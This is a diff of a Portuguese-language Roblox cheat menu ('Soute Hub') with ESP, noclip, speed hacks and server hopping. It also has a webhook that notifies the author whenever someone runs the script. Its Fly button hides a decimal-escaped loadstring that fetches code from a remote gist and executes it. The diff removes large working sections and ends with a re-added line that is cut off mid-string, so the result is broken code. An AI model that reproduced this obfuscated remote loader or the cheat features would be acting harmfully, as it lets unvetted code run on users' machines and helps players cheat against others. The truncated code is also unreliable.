@@ -18,7 +18,7 @@ local function sendWebhook()
         ["embeds"] = {{
             ["title"] = "🎯 Soute Hub Executado",
             ["description"] = "Um usuário executou o Soute Hub!",
-            ["color"] = 15158332, -- Vermelho
+            ["color"] = 15158332,
             ["fields"] = {
                 {
                     ["name"] = "👤 Usuário",
@@ -117,7 +117,7 @@ gradient.Color = ColorSequence.new{
 gradient.Rotation = 45
 gradient.Parent = orb
 
--- Criar ícone de mira/alvo no centro (estilo caveira com mira)
+-- Criar ícone de mira/alvo no centro
 local targetIcon = Instance.new("ImageLabel")
 targetIcon.Name = "TargetIcon"
 targetIcon.Size = UDim2.new(1, 0, 1, 0)
@@ -130,12 +130,12 @@ targetIcon.ScaleType = Enum.ScaleType.Fit
 targetIcon.ZIndex = 11
 targetIcon.Parent = orb
 
--- Arredondar a imagem também
+-- Arredondar a imagem
 local imageCorner = Instance.new("UICorner")
 imageCorner.CornerRadius = UDim.new(1, 0)
 imageCorner.Parent = targetIcon
 
--- Adicionar texto emoji como alternativa caso a imagem não carregue
+-- Adicionar texto emoji
 local emojiLabel = Instance.new("TextLabel")
 emojiLabel.Name = "EmojiIcon"
 emojiLabel.Size = UDim2.new(1, 0, 1, 0)
@@ -266,6 +266,9 @@ end
 local movementPanel = createCategoryPanel("MovementPanel")
 local settingsPanel = createCategoryPanel("SettingsPanel")
 
+-- Ajustar altura do canvas para Settings
+settingsPanel.CanvasSize = UDim2.new(0, 0, 0, 160)
+
 -- Função para criar botões nas categorias
 local function createButton(name, text, position, parent)
     local button = Instance.new("TextButton")
@@ -382,8 +385,9 @@ increaseStroke.Parent = increaseBtn
 
 -- Criar botões de Settings
 local espBtn = createButton("ESPButton", "Wall Esp", UDim2.new(0.06, 0, 0, 7), settingsPanel)
-local serverHopBtn = createButton("ServerHopButton", "Server Hop", UDim2.new(0.06, 0, 0, 43), settingsPanel)
-local rejoinBtn = createButton("RejoinButton", "Server Rejoin", UDim2.new(0.06, 0, 0, 79), settingsPanel)
+local wallPCBtn = createButton("WallPCButton", "Wall PC", UDim2.new(0.06, 0, 0, 43), settingsPanel)
+local serverHopBtn = createButton("ServerHopButton", "Server Hop", UDim2.new(0.06, 0, 0, 79), settingsPanel)
+local rejoinBtn = createButton("RejoinButton", "Server Rejoin", UDim2.new(0.06, 0, 0, 115), settingsPanel)
 
 -- Variáveis de controle
 local panelOpen = false
@@ -391,12 +395,16 @@ local currentCategory = nil
 local savedPosition = nil
 local espEnabled = false
 local espHighlights = {}
+local wallPCEnabled = false
+local wallPCHighlights = {}
 local currentSpeed = 16
 local tpButtonVisible = false
 local infJumpEnabled = false
 local infJumpConnection = nil
 local noclipEnabled = false
 local noclipConnection = nil
+local speedUpdateConnection = nil
+local wallPCUpdateConnection = nil
 
 -- Sistema de arrastar a bolinha
 local dragging = false
@@ -511,7 +519,7 @@ local function togglePanel()
     if panelOpen then
         panel.Visible = true
         panel.Position = UDim2.new(0.5, -120, 1, 0)
-        showCategory("movement") -- Abre direto em Movement
+        showCategory("movement")
         local tween = TweenService:Create(panel, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
             Position = UDim2.new(0.5, -120, 0.5, -145)
         })
@@ -563,7 +571,6 @@ returnBtn.MouseButton1Click:Connect(function()
         return
     end
     
-    -- Toggle do botão de teleporte
     tpButtonVisible = not tpButtonVisible
     
     if tpButtonVisible then
@@ -596,12 +603,27 @@ local function updateSpeed()
     end
 end
 
+-- Sistema de atualização automática da velocidade a cada 1 segundo
+local function startSpeedUpdater()
+    if speedUpdateConnection then
+        speedUpdateConnection:Disconnect()
+    end
+    
+    speedUpdateConnection = game:GetService("RunService").Heartbeat:Connect(function()
+        wait(1)
+        updateSpeed()
+    end)
+end
+
 -- Diminuir velocidade
 decreaseBtn.MouseButton1Click:Connect(function()
     if currentSpeed > 16 then
         currentSpeed = currentSpeed - 1
         speedLabel.Text = "Velocidade: " .. currentSpeed
         updateSpeed()
+        if not speedUpdateConnection then
+            startSpeedUpdater()
+        end
     end
 end)
 
@@ -611,6 +633,9 @@ increaseBtn.MouseButton1Click:Connect(function()
         currentSpeed = currentSpeed + 1
         speedLabel.Text = "Velocidade: " .. currentSpeed
         updateSpeed()
+        if not speedUpdateConnection then
+            startSpeedUpdater()
+        end
     end
 end)
 
@@ -620,14 +645,16 @@ player.CharacterAdded:Connect(function(character)
     if character:FindFirstChild("Humanoid") then
         character.Humanoid.WalkSpeed = currentSpeed
         
-        -- Reativar Infinite Jump se estava ativo
         if infJumpEnabled then
             setupInfiniteJump(character)
         end
         
-        -- Reativar Noclip se estava ativo
         if noclipEnabled then
             setupNoclip()
+        end
+        
+        if currentSpeed ~= 16 and not speedUpdateConnection then
+            startSpeedUpdater()
         end
     end
 end)
@@ -677,253 +704,4 @@ flyBtn.MouseButton1Click:Connect(function()
     flyBtn.BackgroundColor3 = Color3.fromRGB(150, 30, 30)
     
     local success, error = pcall(function()
-        loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
-    end)
-    
-    wait(1)
-    if success then
-        flyBtn.Text = "Fly"
-        flyBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
-    else
-        flyBtn.Text = "Erro no Fly"
-        wait(2)
-        flyBtn.Text = "Fly"
-        flyBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
-    end
-end)
-
--- Função Noclip
-local function setupNoclip()
-    local character = player.Character
-    if not character then return end
-    
-    if noclipConnection then
-        noclipConnection:Disconnect()
-    end
-    
-    noclipConnection = game:GetService("RunService").Stepped:Connect(function()
-        if noclipEnabled and character then
-            for _, part in pairs(character:GetDescendants()) do
-                if part:IsA("BasePart") then
-                    part.CanCollide = false
-                end
-            end
-        end
-    end)
-end
-
--- Toggle Noclip
-noclipBtn.MouseButton1Click:Connect(function()
-    noclipEnabled = not noclipEnabled
-    
-    if noclipEnabled then
-        noclipBtn.Text = "Noclip [ON]"
-        noclipBtn.BackgroundColor3 = Color3.fromRGB(150, 30, 30)
-        
-        local character = player.Character
-        if character then
-            setupNoclip()
-        end
-    else
-        noclipBtn.Text = "Noclip"
-        noclipBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
-        
-        if noclipConnection then
-            noclipConnection:Disconnect()
-            noclipConnection = nil
-        end
-        
-        -- Restaurar colisão
-        local character = player.Character
-        if character then
-            for _, part in pairs(character:GetDescendants()) do
-                if part:IsA("BasePart") then
-                    part.CanCollide = true
-                end
-            end
-        end
-    end
-end)
-
--- Função para criar ESP em um jogador
-local function createESP(targetPlayer)
-    if targetPlayer == player then return end
-    
-    local function setupESP()
-        local character = targetPlayer.Character
-        if not character then return end
-        
-        if espHighlights[targetPlayer] then
-            espHighlights[targetPlayer]:Destroy()
-        end
-        
-        local highlight = Instance.new("Highlight")
-        highlight.Name = "ESP_Highlight"
-        highlight.FillColor = Color3.fromRGB(255, 50, 50)
-        highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
-        highlight.FillTransparency = 0.5
-        highlight.OutlineTransparency = 0
-        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-        highlight.Parent = character
-        
-        espHighlights[targetPlayer] = highlight
-    end
-    
-    setupESP()
-    
-    targetPlayer.CharacterAdded:Connect(function()
-        if espEnabled then
-            wait(0.5)
-            setupESP()
-        end
-    end)
-end
-
--- Função para remover ESP
-local function removeESP(targetPlayer)
-    if espHighlights[targetPlayer] then
-        espHighlights[targetPlayer]:Destroy()
-        espHighlights[targetPlayer] = nil
-    end
-end
-
--- Toggle ESP
-espBtn.MouseButton1Click:Connect(function()
-    espEnabled = not espEnabled
-    
-    if espEnabled then
-        espBtn.Text = "Wall Esp [ON]"
-        espBtn.BackgroundColor3 = Color3.fromRGB(150, 30, 30)
-        
-        for _, targetPlayer in pairs(Players:GetPlayers()) do
-            createESP(targetPlayer)
-        end
-        
-        Players.PlayerAdded:Connect(function(targetPlayer)
-            if espEnabled then
-                targetPlayer.CharacterAdded:Wait()
-                wait(0.5)
-                createESP(targetPlayer)
-            end
-        end)
-    else
-        espBtn.Text = "Wall Esp"
-        espBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
-        
-        for targetPlayer, _ in pairs(espHighlights) do
-            removeESP(targetPlayer)
-        end
-    end
-end)
-
--- Função Server Hop
-serverHopBtn.MouseButton1Click:Connect(function()
-    serverHopBtn.Text = "Procurando..."
-    serverHopBtn.BackgroundColor3 = Color3.fromRGB(200, 150, 50)
-    
-    local success, result = pcall(function()
-        local currentGameId = game.PlaceId
-        local servers = {}
-        
-        local cursor = ""
-        repeat
-            local success, page = pcall(function()
-                return game:GetService("HttpService"):JSONDecode(
-                    game:HttpGet(string.format(
-                        "https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100&cursor=%s",
-                        currentGameId, cursor
-                    ))
-                )
-            end)
-            
-            if success and page then
-                for _, server in pairs(page.data) do
-                    if server.playing < server.maxPlayers and server.id ~= game.JobId then
-                        table.insert(servers, server.id)
-                    end
-                end
-                cursor = page.nextPageCursor or ""
-            else
-                break
-            end
-        until cursor == ""
-        
-        if #servers > 0 then
-            local randomServer = servers[math.random(1, #servers)]
-            TeleportService:TeleportToPlaceInstance(currentGameId, randomServer, player)
-        else
-            serverHopBtn.Text = "Sem servidores"
-            wait(2)
-            serverHopBtn.Text = "Server Hop"
-            serverHopBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
-        end
-    end)
-    
-    if not success then
-        serverHopBtn.Text = "Erro"
-        wait(2)
-        serverHopBtn.Text = "Server Hop"
-        serverHopBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
-    end
-end)
-
--- Função Server Rejoin
-rejoinBtn.MouseButton1Click:Connect(function()
-    rejoinBtn.Text = "Reconectando..."
-    rejoinBtn.BackgroundColor3 = Color3.fromRGB(200, 150, 50)
-    
-    wait(0.5)
-    TeleportService:Teleport(game.PlaceId, player)
-end)
-
--- Efeito hover nos botões de categoria
-local categoryButtons = {movementBtn, settingsBtn}
-for _, button in pairs(categoryButtons) do
-    button.MouseEnter:Connect(function()
-        TweenService:Create(button, TweenInfo.new(0.2), {
-            Size = UDim2.new(0.47, 0, 0, 32)
-        }):Play()
-    end)
-    
-    button.MouseLeave:Connect(function()
-        TweenService:Create(button, TweenInfo.new(0.2), {
-            Size = UDim2.new(0.45, 0, 0, 30)
-        }):Play()
-    end)
-end
-
--- Efeito hover nos botões de ação
-local actionButtons = {saveBtn, returnBtn, espBtn, serverHopBtn, rejoinBtn, infJumpBtn, flyBtn, noclipBtn, decreaseBtn, increaseBtn, tpButton}
-for _, button in pairs(actionButtons) do
-    button.MouseEnter:Connect(function()
-        if button == decreaseBtn or button == increaseBtn then
-            TweenService:Create(button, TweenInfo.new(0.2), {
-                Size = UDim2.new(0, 30, 0, 30)
-            }):Play()
-        elseif button == tpButton then
-            TweenService:Create(button, TweenInfo.new(0.2), {
-                Size = UDim2.new(0, 105, 0, 48)
-            }):Play()
-        else
-            TweenService:Create(button, TweenInfo.new(0.2), {
-                Size = UDim2.new(button.Size.X.Scale + 0.02, 0, 0, button.Size.Y.Offset + 2)
-            }):Play()
-        end
-    end)
-    
-    button.MouseLeave:Connect(function()
-        if button == decreaseBtn or button == increaseBtn then
-            TweenService:Create(button, TweenInfo.new(0.2), {
-                Size = UDim2.new(0, 28, 0, 28)
-            }):Play()
-        elseif button == tpButton then
-            TweenService:Create(button, TweenInfo.new(0.2), {
-                Size = UDim2.new(0, 100, 0, 45)
-            }):Play()
-        else
-            TweenService:Create(button, TweenInfo.new(0.2), {
-                Size = UDim2.new(0.88, 0, 0, 30)
-            }):Play()
-        end
-    end)
-end
+        loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\
